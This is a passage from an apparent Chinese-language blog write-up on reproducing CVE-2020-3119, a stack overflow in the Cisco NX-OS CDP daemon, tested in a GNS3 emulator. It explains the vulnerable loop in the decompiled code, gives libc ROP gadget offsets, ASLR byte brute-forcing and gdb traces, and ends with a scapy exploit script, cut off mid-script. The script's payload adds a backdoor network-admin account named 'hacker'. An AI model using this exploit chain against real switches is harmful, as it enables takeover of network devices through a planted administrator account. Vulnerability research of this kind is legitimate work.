</span></span><span style="display:flex;"><span>            mgmt_id <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ROR2__</span>(pwr_pkt_2<span style="color:#f92672">-&gt;</span>management_id, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>            off_lst_start <span style="color:#f92672">=</span> length <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>            num_levels <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)off_lst_start <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">2</span>;<span style="color:#75715e">// divied sizeof(int) = / 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ...
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( num_levels ) {
</span></span><span style="display:flex;"><span>                current_offset <span style="color:#f92672">=</span> pwr_pkt_2<span style="color:#f92672">-&gt;</span>power_requested;
</span></span><span style="display:flex;"><span>                counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>                    pwr_levels_requested <span style="color:#f92672">=</span> counter <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                    temp[counter <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>current_offset;
</span></span><span style="display:flex;"><span>                    ...
</span></span><span style="display:flex;"><span>                    a1[counter <span style="color:#f92672">+</span> <span style="color:#ae81ff">310</span>] <span style="color:#f92672">=</span> large_buff[counter <span style="color:#f92672">+</span> <span style="color:#ae81ff">254</span>];  <span style="color:#75715e">// a1 dereferenced
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#f92672">++</span>current_offset;
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">++</span>counter;
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">while</span> ( counter <span style="color:#f92672">!=</span> num_levels <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> );
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            ...
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>cdpd_poe_handle_pwr_tlvs</code>函数的第三个参数<code>pwr_pkt_2</code>是一个指向cdp报文中<code>Power Request</code>开始的一个结构体指针，下图中就是指向0x9a<code>Power Request</code>开始的地方。同时我们也可以用wireshark了解到每一个字段的长度，type字段占用两个字节（0x0019），Length字段占用两个字节（0x84=132），request-id和managem-id都占用2个字节（0x6161=24929），然后就是每个长度4字节的Power Request数组。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992443/blog/CVE-2020-3119/wireshark-cdp_bm7oyp.png" alt=""  />
</p>
<p>在IDA中定义这个结构体相应的成员。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992442/blog/CVE-2020-3119/pwr_req_waosy8.png" alt=""  />
</p>
<p><code>cdpd_poe_handle_pwr_tlvs</code>函数在第一个if分支处理Version 1的情况，然后进入第二个分支处理Version 2的情况，然后在pwr_pkt_2指针不为空的情况下，将报文中length、req_id、mgmt_id三个字段从网络字节序转换成主机字节序，然后计算Power Request数组的长度off_lst_start，利用off_lst_start除以4的方法得到这个数组元素的个数num_levels。此时num_levels使用cdp报文中的length字段计算得到的，也就是说，是用户可控的。</p>
<p>然后进入一个num_levels次的循环，每次循环会将pwr_pkt_2中的一个int的数据拷贝到本地的数组temp中。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992443/blog/CVE-2020-3119/temp_yog3nf.png" alt=""  />
</p>
<p>点击temp变量可以看到其在栈中相对当前函数栈底的位置，它正好是这个函数最底部的变量，并且没有启用栈cookie，距离保存的ebp的偏移是0x40也就是16个int变量的距离（0x4 / 4 = 0x10）。</p>
<p>由于没有对Power Request的个数进行检查，所以我们可以轻松地构造Power Request个数超过16的CDP报文，在填充16个int的padding之后就可以覆盖到ebp、返回地址以及之后的值。</p>
<h1 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h1>
<p>环境搭建可能是整个漏洞复现过程中最麻烦的一个步骤，其中的坑比漏洞利用本身还要多，笔者试着将自己遇到的一些坑记录一下。</p>
<p>使用GNS3模拟器可以对<code>Cisco NX-OSv 9000</code>交换机进行全系统模拟，其实质是使用qemu进行虚拟化。笔者实验使用的GNS3版本为2.2.17，截至本文写作之时GNS3版本已升级至2.2.17，不过GNS3的版本不同应该不会有什么问题。GNS3安装本身遇到问题的话可以参见这篇<a href="https://zhuanlan.zhihu.com/p/102255178">教程</a>。</p>
<p>接下的一件事是下载固件，由于我一开始对Cisco的产品线没有什么了解，固件的格式也分不清楚，导致下载了两次都发现下载错了，和GNS3所要求使用的固件不匹配。GNS3是支持<code>Cisco NX-OS 9000</code>的模拟的，但是这个被模拟系统有一个另外的名字：<code>Cisco NX-OSv 9000</code>，NX OSv 9000是一个虚拟平台，旨在模拟运行Cisco Nexus 9000操作系统的网络设备。尽管没有实现特定的硬件仿真，但是NX OSv 9000和Cisco Nexus 9000上运行的软件是一模一样的。具体的介绍可以查阅<a href="https://www.gns3.com/marketplace/appliances/cisco-nx-osv-9000">官网</a>。</p>
<p>所以说，不是Cisco官网上提供的所有固件下载下来都是可以用GNS3跑的，必须要下载它指定的系统镜像，如下图所示，我们要下载nxosv-final.9.2.3.qcow2这个文件，OVMF-20160813.fd是GNS3自带的一个文件：</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992442/blog/CVE-2020-3119/nxosv_tljnny.png" alt=""  />
</p>
<p>下载得到固件之后将固件导入到GNS3中创建模板，创建的时候默认的一些模板参数不要改动，特别是内存默认是8G的不要改小了，小于8G的话系统就跑不起来了。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992441/blog/CVE-2020-3119/configure_wpfjth.png" alt=""  />
</p>
<p>在网络拓扑方面我直接将本机的WLAN端口和交换机的e1/1端口相连，在物理机编写好exp后可以直接发送给交换机。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992441/blog/CVE-2020-3119/network_dxdc8l.png" alt=""  />
</p>
<p>在<a href="https://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus9000/sw/7-x/nx-osv/configuration/guide/b_NX-OSv_9000/b_NX-OSv_chapter_01.html">官网</a>的教程里有这么一段话：</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992442/blog/CVE-2020-3119/guideline_vgmvaq.png" alt=""  />
</p>
<p>需要照做，不然确实再次启动就起不来了。</p>
<p>系统的的启动是很慢的，需要等不少时间。等看到login prompt后输入admin和密码就可以登录了。（中间一大段是系统log）</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992442/blog/CVE-2020-3119/guideline_vgmvaq.png" alt=""  />
</p>
<p>进入Cisco的shell之后run bash即可拿到一个bash，再su输入admin的密码即可拿到rootshell。</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691992442/blog/CVE-2020-3119/rootshell_m6azfe.png" alt=""  />
</p>
<p>环境到此就算搭建完成了，有了root shell也可以用gdb调试任意的进程了，接下来介绍漏洞利用的思路。</p>
<h1 id="漏洞利用">漏洞利用<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h1>
<h2 id="scapy构造cdp报文">scapy构造CDP报文<a hidden class="anchor" aria-hidden="true" href="#scapy构造cdp报文">#</a></h2>
<p>使用scapy可以构造CDP包，从Hcamael师傅的分析文章中截取一段模板如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.contrib <span style="color:#f92672">import</span> cdp
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> Ether, LLC, SNAP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>l2_packet <span style="color:#f92672">=</span> Ether(dst<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;01:00:0c:cc:cc:cc&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Logical-Link Control</span>
</span></span><span style="display:flex;"><span>l2_packet <span style="color:#f92672">/=</span> LLC(dsap<span style="color:#f92672">=</span><span style="color:#ae81ff">0xaa</span>, ssap<span style="color:#f92672">=</span><span style="color:#ae81ff">0xaa</span>, ctrl<span style="color:#f92672">=</span><span style="color:#ae81ff">0x03</span>) <span style="color:#f92672">/</span> SNAP()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cisco Discovery Protocol</span>
</span></span><span style="display:flex;"><span>cdp_v2 <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPv2_HDR(vers<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">180</span>)
</span></span><span style="display:flex;"><span>deviceid <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgDeviceID(val<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;nxos922(97RROM91ST3)&#39;</span>)
</span></span><span style="display:flex;"><span>portid <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgPortID(iface<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ens38&#34;</span>)
</span></span><span style="display:flex;"><span>address <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgAddr(naddr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, addr<span style="color:#f92672">=</span>cdp<span style="color:#f92672">.</span>CDPAddrRecordIPv4(addr<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.1.3&#34;</span>))
</span></span><span style="display:flex;"><span>cap <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgCapabilities(cap<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>cdp_packet <span style="color:#f92672">=</span> cdp_v2<span style="color:#f92672">/</span>deviceid<span style="color:#f92672">/</span>portid<span style="color:#f92672">/</span>address<span style="color:#f92672">/</span>cap
</span></span><span style="display:flex;"><span>packet <span style="color:#f92672">=</span> l2_packet <span style="color:#f92672">/</span> cdp_packet
</span></span><span style="display:flex;"><span>sendp(packet)
</span></span></code></pre></div><p>漏洞利用的思路比较明确，由于不存在栈canary但是有ASLR和NX，溢出后可以ROP至libc段或其他可执行段去执行system函数。</p>
<p>在实际测试中，libc的基址只有一个字节会发生变化。这是由于32位ASLR的是整体在一个随机的基址上进行一个整体的偏移的。所以即便面对ASLR我们也可以通过爆破一个字节来获取一个确定的libc基址，具体的原理参见<a href="https://security.stackexchange.com/questions/50945/aslr-why-do-only-12-bits-change-on-32bit-system">Stack Overflow上的一个回答</a>。</p>
<pre tabindex="0"><code>0xf5def000 0xf5fa0000   0x1b1000        0x0 /lib/libc-2.22.so
0xf5dda000 0xf5f8b000   0x1b1000        0x0 /lib/libc-2.22.so
0xf5dfe000 0xf5faf000   0x1b1000        0x0 /lib/libc-2.22.so
0xf5d84000 0xf5f35000   0x1b1000        0x0 /lib/libc-2.22.so
0xf5e12000 0xf5fc3000   0x1b1000        0x0 /lib/libc-2.22.so
</code></pre><h2 id="返回之前的约束">返回之前的约束<a hidden class="anchor" aria-hidden="true" href="#返回之前的约束">#</a></h2>
<p>利用的过程中有两个地方需要注意：</p>
<p>第一个是我们在覆盖了eip之后紧接着就会覆盖到第一个参数a1的值，但是a1在程序返回之前还会被解引用，并且a1的周围还会被写入数据，所以a1必须覆盖成一个可写的指针。</p>
<p>还有第二个地方需要注意的是在溢出操作之后必须要尽可能快的让函数执行到返回的地方，但是在溢出点之后执行流可能会进入到<code>cdpd_send_pwr_req_to_poed</code>函数中，该函数会调用<code>__memcpy_to_buf</code>限制了Power Requested的长度在40字节以内，导致溢出失败。为了不进入这个函数，我们必须要使得下面这个if条件判断为真，进入该分支不会执行到<code>cdpd_send_pwr_req_to_poed</code>函数中，并且能够顺利地执行到函数返回。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v6 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_WORD <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">604</span>);
</span></span><span style="display:flex;"><span>v7 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_WORD <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">602</span>);
</span></span><span style="display:flex;"><span>v8 <span style="color:#f92672">=</span> a1[<span style="color:#ae81ff">303</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( req_id <span style="color:#f92672">==</span> v6 <span style="color:#f92672">&amp;&amp;</span> mgmt_id <span style="color:#f92672">==</span> v7 )
</span></span></code></pre></div><p>由于此时a1已经被覆盖，a1的值已经是我们所控制的值，所以结合上面的这两个约束条件，我们可以在内存中找一片可写的内存，并且该内存周围全是空值，然后设置req_id和mgmt_id也为控制，便可以满足这两个约束条件。</p>
<h2 id="rop链的构造">ROP链的构造<a hidden class="anchor" aria-hidden="true" href="#rop链的构造">#</a></h2>
<p>由于libc的基址我们已经假设爆破得到了，在该libc中寻找可以进行system的ROP链就是利用的最后一步。</p>
<p>这里值得提的一点是该漏洞是没有交互的，一个CDP报文发送过去之后就没有然后了，没有输入，也没有输出，所有的payload都是在一个cdp包内发送的，payload的目的也不是去执行<code>system(&quot;/bin/sh&quot;)</code>，而是要选择其他的命令，这里介绍两种：</p>
<p>第一种，可以执行反连shell的代码。</p>
<p>第二种，可以添加一个管理员账号，比如执行如下命令：<code>/isan/bin/vsh -c &quot;configure terminal ; username hacker password qweASD123 role network-admin&quot;</code></p>
<p>我们选择第二种方法，那么最后一个问题是，这个system的参数，如何传递？</p>
<p>很巧的是，在溢出之后的栈上残留了一个指针，下面的例子中是<code>0x100a883a</code>这个指针，这个指针指向了cdp报文中的DeviceID开始的地方，于是我们可以利用这个指针在DeviceID中写入我们要执行的命令来进行system参数的传递。</p>
<p>但是美中不足的是DeviceID字段开头必须是固定的一个整数表示type，也就是说如果直接使用这个指针作为参数那么system的参数一定是以<code>0x0001</code>开头的，这是不能利用的，所以我们不得不对这个指针向后移动，至少移动4字节，指向我们所控制的数据区内。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>(gdb) x/240xb 0x100a890a - 234
</span></span><span style="display:flex;"><span>0x100a8820 &lt;packet&gt;:    0x01    0x00    0x0c    0xcc    0xcc    0xcc    0xc8    0x21
</span></span><span style="display:flex;"><span>0x100a8828 &lt;packet+8&gt;:  0x58    0x68    0xcf    0x22    0x00    0xe2    0xaa    0xaa
</span></span><span style="display:flex;"><span>0x100a8830 &lt;packet+16&gt;: 0x03    0x00    0x00    0x0c    0x20    0x00    0x02    0xb4
</span></span><span style="display:flex;"><span>0x100a8838 &lt;packet+24&gt;: 0x19    0x15    0x00    0x01    0x00    0x60    0x2f    0x69
</span></span><span style="display:flex;"><span>0x100a8840 &lt;packet+32&gt;: 0x73    0x61    0x6e    0x2f    0x62    0x69    0x6e    0x2f
</span></span><span style="display:flex;"><span>0x100a8848 &lt;packet+40&gt;: 0x76    0x73    0x68    0x20    0x2d    0x63    0x20    0x22
</span></span><span style="display:flex;"><span>0x100a8850 &lt;packet+48&gt;: 0x63    0x6f    0x6e    0x66    0x69    0x67    0x75    0x72
</span></span><span style="display:flex;"><span>0x100a8858 &lt;packet+56&gt;: 0x65    0x20    0x74    0x65    0x72    0x6d    0x69    0x6e
</span></span><span style="display:flex;"><span>(gdb) x/40xw $esp
</span></span><span style="display:flex;"><span>0xffffc9cc:     0x64646464                    0xf680965c(1st)             0x65656565      0x65656565
</span></span><span style="display:flex;"><span>0xffffc9dc:     0x65656565                    0x0000001a                  0xffffca38      0x1008ac10
</span></span><span style="display:flex;"><span>0xffffc9ec:     0x1009f798                    0xffffca3c(mov_pop_edi_ret) 0xffffca58(edi) 0xffffceb8 (add_eax_0xc_ret)
</span></span><span style="display:flex;"><span>0xffffc9fc:     0x1002e8b8(push_eax_call_edi) 0x100a883a                  0x00b40000      0x100a891a
</span></span></code></pre></div><p>上面这是函数返回时内存的一个情况，0xffffc9cc指向被劫持的eip。</p>
<p>所以我们就在libc寻找可以利用的gadget，找到如下gadget：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>ret = base + 0x000003f3                 # 0x000003f3 : ret
</span></span><span style="display:flex;"><span>pop_edi_ret = base + 0x0001764b         # 0x0001764b : pop edi ; ret
</span></span><span style="display:flex;"><span>pop_eax_ret = base + 0x00021b07         # 0x00021b07 : pop eax ; ret
</span></span><span style="display:flex;"><span>mov_pop_edi_ret = base + 0x001434c2     # 0x001434c2 : mov eax, dword ptr [esp + 0xc] ; pop edi ; ret
</span></span><span style="display:flex;"><span>add_eax_0xc_ret = base + 0x0010385a     # 0x0010385a : add eax, 0xc ; ret
</span></span><span style="display:flex;"><span>push_eax_call_edi = base + 0x0001cb19   # 0x0001cb19 : push eax ; call edi
</span></span></code></pre></div><p>最后构造ROP链。</p>
<h1 id="模拟器调试">模拟器调试<a hidden class="anchor" aria-hidden="true" href="#模拟器调试">#</a></h1>
<p>首先关闭系统的ASLR</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>switch# run bash
</span></span><span style="display:flex;"><span>bash-4.3$ su
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span>bash-4.3# id
</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
</span></span><span style="display:flex;"><span>bash-4.3# ps aux | grep cdpd
</span></span><span style="display:flex;"><span>root      1650  0.0  0.0   5944  1776 ttyS0    S+   01:28   0:00 grep cdpd
</span></span><span style="display:flex;"><span>root     27967  0.1  0.8 832896 72008 ?        Ss   01:20   0:00 /isan/bin/cdpd
</span></span><span style="display:flex;"><span>bash-4.3# cat /proc/sys/kernel/randomize_va_space
</span></span><span style="display:flex;"><span>2
</span></span><span style="display:flex;"><span>bash-4.3# echo 0 | tee /proc/sys/kernel/randomize_va_space
</span></span><span style="display:flex;"><span>0
</span></span><span style="display:flex;"><span>bash-4.3# cat /proc/sys/kernel/randomize_va_space
</span></span><span style="display:flex;"><span>0
</span></span></code></pre></div><p>然后先用exp打一次，这个时候的cdpd是开了ASLR的，所以会崩溃，崩溃之后重启的cdpd就是没有开ASLR的了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>bash-4.3# 2021 Mar 15 01:30:34 switch %$ VDC-1 %$ %SYSMGR-2-SERVICE_CRASHED: Service &#34;cdp&#34; (PID 27967) hasn&#39;t caught signal 11 (core will be saved).
</span></span></code></pre></div><p>使用gdb attach挂载到cdpd进程上，在<code>cdpd_poe_handle_pwr_tlvs</code>函数ret的地方下断点，然后继续调试，同时用exp再打一遍。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>bash-4.3# ps aux | grep cdpd
</span></span><span style="display:flex;"><span>root      1890  1.6  0.8 835100 70452 ?        Ss   01:30   0:00 /isan/bin/cdpd
</span></span><span style="display:flex;"><span>root      2519  0.0  0.0   5944  1760 ttyS0    S+   01:31   0:00 grep cdpd
</span></span><span style="display:flex;"><span>bash-4.3# gdb /isan/bin/cdpd -p 1890
</span></span><span style="display:flex;"><span>GNU gdb (GDB) 7.10.1
</span></span><span style="display:flex;"><span>Copyright (C) 2015 Free Software Foundation, Inc.
</span></span><span style="display:flex;"><span>Reading symbols from /isan/bin/cdpd...(no debugging symbols found)...done.
</span></span><span style="display:flex;"><span>Attaching to program: /isan/bin/cdpd, process 1890
</span></span><span style="display:flex;"><span>Reading symbols from /usr/lib/libssl.so.1.0.0...(no debugging symbols found)...done.
</span></span><span style="display:flex;"><span>    ......
</span></span><span style="display:flex;"><span>Reading symbols from /isan/lib/libigmp_dll.so...(no debugging symbols found)...done.
</span></span><span style="display:flex;"><span>0xf7fd8c30 in __kernel_vsyscall ()
</span></span><span style="display:flex;"><span>(gdb) info proc mappings
</span></span><span style="display:flex;"><span>process 1890
</span></span><span style="display:flex;"><span>Mapped address spaces:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Start Addr   End Addr       Size     Offset objfile
</span></span><span style="display:flex;"><span>        0x10000000 0x1009f000    0x9f000        0x0 /isan/bin/cdpd
</span></span><span style="display:flex;"><span>        0x1009f000 0x100a1000     0x2000    0x9f000 /isan/bin/cdpd
</span></span><span style="display:flex;"><span>        0x100a1000 0x103b4000   0x313000        0x0 [heap]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(gdb) b *(0x369EF+0x10000000)
</span></span><span style="display:flex;"><span>Breakpoint 1 at 0x100369ef
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(gdb) c
</span></span><span style="display:flex;"><span>Continuing.
</span></span></code></pre></div><p>这次gdb就会在<code>cdpd_poe_handle_pwr_tlvs</code>函数返回的时候停下来，观察溢出后的栈的情况：</p>
<pre tabindex="0"><code>Breakpoint 1, 0x100369ef in cdpd_poe_handle_pwr_tlvs ()
(gdb)
(gdb) x/40xw $esp
0xffffc9cc:     0xf666b64b      0xf680965c      0xf66543f3      0xf66543f3
0xffffc9dc:     0xf66543f3      0xf66543f3      0xf66543f3      0xf66543f3
0xffffc9ec:     0xf66543f3      0xf67974c2      0xf6690790      0xf675785a
0xffffc9fc:     0xf6670b19      0x100a883a      0x00b40000      0x100a8944
0xffffca0c:     0x100a88c4      0x103447cc      0x10345ecc      0x01140201
0xffffca1c:     0x00000000      0x00000006      0x10110b0c      0x100a894a
0xffffca2c:     0xffff0006      0xf7fe79fb      0xf692926c      0x31313131
0xffffca3c:     0x6f662020      0x20646e75      0x20727750      0x736e6f43
0xffffca4c:     0x564c5420      0x3020000a      0x202c3378      0x695f6669
0xffffca5c:     0x7865646e      0x78305b3a      0x30306131      0x30303030


(gdb) x/2i 0xf666b64b
   0xf666b64b &lt;__libgcc_s_init+139&gt;:    pop    %edi
   0xf666b64c &lt;__libgcc_s_init+140&gt;:    ret
(gdb) x/i 0xf66543f3
   0xf66543f3:  ret
(gdb) x/3i 0xf67974c2
   0xf67974c2 &lt;__strnlen_sse2+962&gt;:     mov    0xc(%esp),%eax
   0xf67974c6 &lt;__strnlen_sse2+966&gt;:     pop    %edi
   0xf67974c7 &lt;__strnlen_sse2+967&gt;:     ret
(gdb) x/2i 0xf675785a
   0xf675785a &lt;inet6_option_space+10&gt;:  add    $0xc,%eax
   0xf675785d &lt;inet6_option_space+13&gt;:  ret
(gdb) x/2i 0xf6670b19
   0xf6670b19 &lt;__gconv_transform_ascii_internal+201&gt;:   push   %eax
   0xf6670b1a &lt;__gconv_transform_ascii_internal+202&gt;:   call   *%edi
(gdb) x/i 0xf6690790
   0xf6690790 &lt;__libc_system&gt;:  sub    $0xc,%esp
(gdb) x/3s 0x100a883a
0x100a883a &lt;packet+26&gt;: &#34;&#34;
0x100a883b &lt;packet+27&gt;: &#34;\001&#34;
0x100a883d &lt;packet+29&gt;: &#34;jxxxxxxxx/isan/bin/vsh -c \&#34;configure terminal ; username hacker password qweASD123 role network-admin\&#34;&#34;
</code></pre><p><code>0xf680965c</code>这个指针位于a1的位置，也就是第一个参数，是我随机选择的指向libc数据段的一个指针，它的周围都是0，满足上述的那些条件，随后用<code>0xf66543f3</code>处单条的ret语句调整esp的位置靠近我们想要的指针<code>0x100a883a</code>，然后通过</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>    <span style="color:#ae81ff">0xc</span>(%esp),%eax
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span>    %edi
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>    <span style="color:#66d9ef">$0xc</span>,%eax
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span>   %eax
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span>   *%edi
</span></span></code></pre></div><p>这5条指令实现<code>system(&quot;/isan/bin/vsh -c \&quot;configure terminal ; username hacker password qweASD123 role network-admin\&quot;&quot;)</code>的效果。</p>
<h1 id="完整exp">完整exp<a hidden class="anchor" aria-hidden="true" href="#完整exp">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.contrib <span style="color:#f92672">import</span> cdp
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> Dot3, LLC, SNAP, sendp
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ethernet <span style="color:#f92672">=</span> Dot3(dst<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;01:00:0c:cc:cc:cc&#34;</span>)
</span></span><span style="display:flex;"><span>llc <span style="color:#f92672">=</span> LLC(dsap<span style="color:#f92672">=</span><span style="color:#ae81ff">0xaa</span>, ssap<span style="color:#f92672">=</span><span style="color:#ae81ff">0xaa</span>, ctrl<span style="color:#f92672">=</span><span style="color:#ae81ff">0x03</span>) <span style="color:#f92672">/</span> SNAP()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cdp_header <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPv2_HDR(vers<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">180</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># deviceid = cdp.CDPMsgDeviceID(val=&#39;nxos922(97RROM91ST3)&#39;)</span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0xc</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/isan/bin/vsh -c &#34;configure terminal ; username hacker password qweASD123 role network-admin&#34;&#39;</span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>deviceid <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgDeviceID(val<span style="color:#f92672">=</span>cmd)
</span></span><span style="display:flex;"><span>portid <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgPortID(iface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;br0&#34;</span>)
</span></span><span style="display:flex;"><span>address <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgAddr(naddr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, addr<span style="color:#f92672">=</span>cdp<span style="color:#f92672">.</span>CDPAddrRecordIPv4(addr<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.110.130&#34;</span>))
</span></span><span style="display:flex;"><span>cap <span style="color:#f92672">=</span> cdp<span style="color:#f92672">.</span>CDPMsgCapabilities(cap<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf6654000</span>
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3C790</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000003f3</span>                 <span style="color:#75715e"># 0x000003f3 : ret</span>
</span></span><span style="display:flex;"><span>pop_edi_ret <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0001764b</span>         <span style="color:#75715e"># 0x0001764b : pop edi ; ret</span>
